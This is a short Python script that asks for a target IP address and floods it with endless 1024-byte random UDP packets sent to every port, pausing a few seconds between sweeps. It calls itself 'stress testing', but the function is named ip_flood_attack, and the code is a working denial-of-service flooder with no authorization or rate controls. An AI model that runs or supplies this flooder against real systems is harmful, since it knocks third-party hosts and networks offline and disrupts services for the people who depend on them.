import socket
import random
import time

def ip_flood_attack(target_ip):
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet_data = random._urandom(1024)  # Use a smaller packet size

    while True:
        for port in range(1, 65535):
            udp_socket.sendto(packet_data, (target_ip, port))
            print(f"Sent packet to {target_ip}:{port}")
        time.sleep(3)

def main():
    target_ip = input("Enter the target IP: ")
    
    try:
        socket.inet_aton(target_ip)  # Check if the IP address is valid
    except socket.error:
        print("Invalid IP address.")
        return

    print(f"Stress testing {target_ip}...")
    ip_flood_attack(target_ip)

if __name__ == '__main__':
    main()
    
